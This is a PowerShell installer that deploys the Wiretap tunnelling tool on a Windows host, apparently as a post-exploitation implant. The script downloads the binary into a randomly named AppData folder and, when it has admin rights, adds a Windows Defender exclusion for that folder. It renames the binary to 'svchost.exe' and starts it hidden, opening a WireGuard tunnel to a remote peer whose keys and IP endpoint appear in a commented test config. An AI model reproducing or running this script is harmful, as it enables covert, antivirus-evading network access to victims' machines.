# # For testing ....
# $env:X='1-QCM/uHtxKqfGaiascAnP3UNVlO5fa2FeotsFBv15mEs='
# $env:X+='-cDZxMltJHcVjY+VKcHDpo17ooYBBwkMq6ebZ0R0ZzFs='
# $env:X+='-136.243.39.18:47007-172.16.0.x/16,fd:16::x/104'
# $env:DEBUG=""

$GITHUB_REPO="https://api.github.com/repos/sandialabs/wiretap/releases/latest"
$WT_BIN_NAME="wiretap.exe"
$WT_BIN_HIDDEN_NAME="svchost.exe"
$WT_SCHEDULED_TASK_NAME="MS-Update"
$BANNER=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("CgoKCeKjvuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+KjtwoJ4qO/4qO/4qGP4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qK54qO/4qO/Cgnio7/io7/ioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjio7/io78KCeKjv+Kjv+Khh+KggOKggOKggOKggOKggOKiuOKjv+Kjv+Kjv+Kjv+Khh+KggOKggOKggOKggOKggOKiuOKjv+KjvwoJ4qO/4qO/4qGH4qCA4qKw4qO24qO24qO24qO+4qO/4qO/4qO/4qO/4qO34qO24qO24qO24qGG4qCA4qK44qO/4qO/Cgnio7/io7/ioYfioIDiorjio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/ioYfioIDiorjio7/io78KCeKjv+Kjv+Khh+KggOKiuOKjv+Kgv+Kjv+Khv+Kiv+Kjv+Kjv+Khv+Kiv+Kjv+Kgv+Kjv+Khh+KggOKiuOKjv+KjvwoJ4qO/4qO/4qGH4qCA4qK44qO/4qCA4qO/4qGH4qK44qO/4qO/4qGH4qK44qO/4qCA4qO/4qGH4qCA4qK44qO/4qO/Cgnio7/io7/ioYfioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDiorjio7/io78KCeKjv+Kjv+Kjh+KjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjgOKjuOKjv+KjvwoJ4qK/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qG/CgojPT09PT09PSBXaXJldGFwIEluc3RhbGxlciAgPT09PT09PT09Iw==")) | Out-String

function Print-Warning($str)
{
    Write-Host "[!] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Status($str)
{
    Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
    Write-Host "$str" 
}

function Print-Success($str)
{
    Write-Host "[+] " -ForegroundColor Green -NoNewline; 
    Write-Host "$str" 
}

function Print-Error($str)
{
    Write-Host "[-] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
}

function Print-Fatal($str)
{
    Write-Host "[!] " -ForegroundColor Red -NoNewline; 
    Write-Host "$str" 
    exit 1
}

function Print-Progress($str)
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline;
        Write-Host "$str" -NoNewline;
        Write-Host ("."*(60-$str.Length)) -NoNewline;
    }  
}

function Print-Ok()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "OK" -ForegroundColor Green -NoNewline;
        Write-Host "]";
    }  
}

function Print-Fail()
{
    if (-Not (Test-Path 'env:DEBUG')) { 
        Write-Host "[" -NoNewline;
        Write-Host "FAIL" -ForegroundColor Red -NoNewline;
        Write-Host "]";
    }  
}

function Print-Debug($str)
{
    if (Test-Path 'env:DEBUG') { 
        Write-Host "[*] " -ForegroundColor Yellow -NoNewline; 
        Write-Host "$str" 
    }  
}

function Is-Administrator  
{  
    return [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}

function Get-Latest-Release  
{
    $WT_PACKAGE="wiretap_0.3.1_windows_amd64.zip"
    Switch ($Env:PROCESSOR_ARCHITECTURE)
    {
        "x86" {$WT_PACKAGE="wiretap_0.3.1_windows_386.zip"}
        "AMD64" {$WT_PACKAGE="wiretap_0.3.1_windows_amd64.zip"}
        "ARM64" {$WT_PACKAGE="wiretap_0.3.1_windows_arm64.zip"}
        "ARM" {$WT_PACKAGE="wiretap_0.3.1_windows_arm64.zip"}
        default {Print-Fatal "Unsupported Windows architecture!"}
    }
    Print-Debug "$WT_PACKAGE"
    try {
        $r = Invoke-WebRequest -UseBasicParsing "$GITHUB_REPO"
        $lines = $r.Content.Split('"')
        $uri=(echo $lines | Select-String '/releases/download/' | Select-String "$WT_PACKAGE")
    }catch {
        Print-Debug $_.Exception
        throw $_.Exception
    }
    return $uri.Line.split()
}

function Download-Wiretap-Util($path)
{
    try {
        $downloadUrl = Get-Latest-Release
        Print-Debug "Latest Release: $downloadUrl"
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add("Accept","application/octet-stream")
        $WebClient.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
        $WebClient.DownloadFile($downloadUrl, $path)
        if(Test-Path -Path "$path" -PathType Leaf){
            Print-Debug "Wiretap binary downloaded under: $path"
        }
    }catch{
        Print-Debug $_.Exception
        throw $_.Exception
    }
}

function Print-Usage
{
    Write-Host " `n"
    Print-Warning "Wiretap is not good for scanning."
    Write-Host "`t===> Masscan   : -e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791" -ForegroundColor Yellow
    Write-Host " `n"
    Print-Success "SUCCESS - Wiretap started as $WT_BIN_HIDDEN_NAME in the background."
    # Write-Host "---> To stop   : ${CDC}${CMD_PKILL} '${killname}'${CN}" -ForegroundColor Red
    Write-Host " `n"
}

function Parse-Config
{
    $CONF=(($env:X).split('-'))
    if ($CONF.Length -lt 4 ){
        Print-Fatal "X= is not a valid configuration string."
    }
    if ($CONF[1].Length -ne 44 ){
        Print-Fatal "X= does not contain a valid private key."
    }
    if ($CONF[2].Length -ne 44 ){
        Print-Fatal "X= does not contain a valid public key."
    }

    $SF_VER=($CONF[0] -match '//[^0-9]')
    $PRIV=$CONF[1]
    $PEER=$CONF[2]
    $EP=$CONF[3]

    try{
        if ($SF_VER -gt 0) {
            Print-Fatal "X= contains a bad version number."
        }
    }catch{
        Print-Fatal "X= contains a bad version number."
    }


    ### SF < 0.4.7 compatible
    $env:ADDRESS="192.168.0.1/32"
    $env:ADDRES6="fd::1/128"
    $env:PEER_ADDRESS="192.168.0.0/16"
    $env:PEER_ADDRES6="fd::0/104"

    $str=$CONF[4]
    if (![string]::IsNullOrEmpty($str)) {
        $ip = ($str -split ",")[0]
        $env:PEER_ADDRES = $ip -replace 'x', '0'
        $ip = $ip -replace '/.*$'
        $env:ADDRES = ($ip -replace 'x', '1') + "/32"
        $ip = ($str -split ",")[1]
        $env:PEER_ADDRES6 = ($ip -replace 'x', '0')
        $ip = $ip -replace '/.*$'
        $env:ADDRES6 = ($ip -replace 'x', '1') + "/128"
    }

    Print-Debug "ADDRES: $env:ADDRES"
    Print-Debug "ADDRES6: $env:ADDRES6"
    Print-Debug "PEER_ADDRES: $env:PEER_ADDRES"
    Print-Debug "PEER_ADDRES6: $env:PEER_ADDRES6"


    if ($SF_VER -eq 1) {
        Set-Item -Path Env:WIRETAP_INTERFACE_PRIVATEKEY -Value $PRIV
        Set-Item -Path Env:WIRETAP_PEER_PUBLICKEY -Value $PEER
        Set-Item -Path Env:WIRETAP_PEER_ENDPOINT -Value $EP

        Print-Debug "WIRETAP_INTERFACE_PRIVATEKEY: $env:WIRETAP_INTERFACE_PRIVATEKEY"
        Print-Debug "WIRETAP_PEER_PUBLICKEY: $env:WIRETAP_PEER_PUBLICKEY"
        Print-Debug "WIRETAP_PEER_ENDPOINT: $env:WIRETAP_PEER_ENDPOINT"
    }
    else {
        Set-Item -Path Env:WIRETAP_RELAY_INTERFACE_PRIVATEKEY -Value $PRIV
        Set-Item -Path Env:WIRETAP_RELAY_PEER_PUBLICKEY -Value $PEER
        Set-Item -Path Env:WIRETAP_RELAY_PEER_ENDPOINT -Value $EP
        Set-Item -Path Env:WIRETAP_SIMPLE -Value "true"

        Print-Debug "WIRETAP_RELAY_INTERFACE_PRIVATEKEY: $env:WIRETAP_RELAY_INTERFACE_PRIVATEKEY"
        Print-Debug "WIRETAP_RELAY_PEER_PUBLICKEY: $env:WIRETAP_RELAY_PEER_PUBLICKEY"
        Print-Debug "WIRETAP_RELAY_PEER_ENDPOINT: $env:WIRETAP_RELAY_PEER_ENDPOINT"
        Print-Debug "WIRETAP_SIMPLE: $env:WIRETAP_SIMPLE"
    }
}


Write-Host "$BANNER"
$RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
# Create WT_PATH
$WT_PATH= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
Print-Status "Wiretap Path: $WT_PATH"
mkdir $WT_PATH >$null

if (Is-Administrator) {
    Print-Progress "Adding defender exclusion path"
    try {
        Add-MpPreference -ExclusionPath "$WT_PATH" >$null
        Print-Ok
    }catch {
        Print-Fail
    }
}

# Download the latest wiretap utility
try {
    Print-Progress "Downloading binaries"
    Download-Wiretap-Util(Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.zip")
    Print-Ok  
}catch {
    Print-Fail
    Print-Fatal "Failed downloading Wiretap util."
}

# Extract ZIP to WT_PATH
try {
    Print-Progress "Unpacking binaries"
    Expand-Archive -Path (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.zip") -DestinationPath "$WT_PATH"
    # tar zx -C "$WT_PATH" -f (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.tar.gz") 2>$null
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Failed extracting Wiretap util."
}

try {
    Print-Progress "Copying binaries"
    Remove-Item -Path (Join-Path -Path $WT_PATH -ChildPath "$RAND_NAME.zip")
    Rename-Item -Path (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_NAME") -NewName "$WT_BIN_HIDDEN_NAME"
    if(! (Test-Path -Path (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -PathType Leaf)){
        Print-Fail
        Print-Fatal "Move failed. ->  $WT_PATH\$WT_BIN_HIDDEN_NAME"
    }
    Print-Ok
}catch {
    Print-Fail
    Print-Fatal "Unable to copy qsocket binaries."
}

try {
    Print-Progress "Testing wiretap binaries"
    Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "-h"
    Print-Ok
}catch{
    Print-Fail
    Print-Fatal "Binary test failed! Exiting..."
}

Parse-Config

try {
    Print-Progress "Starting wiretap"
    Print-Debug (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME")+"serve --allowed $env:PEER_ADDRESS"
    
    if (-not $env:DEBUG) {
        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "-q", "--allowed", $env:PEER_ADDRESS -WindowStyle Hidden
    }
    else {
        Start-Process -FilePath (Join-Path -Path $WT_PATH -ChildPath "$WT_BIN_HIDDEN_NAME") -ArgumentList "serve", "--allowed", $env:PEER_ADDRESS -Wait # -WindowStyle Hidden
    }
    Print-Ok
}catch{
    Print-Fail
}
Print-Usage
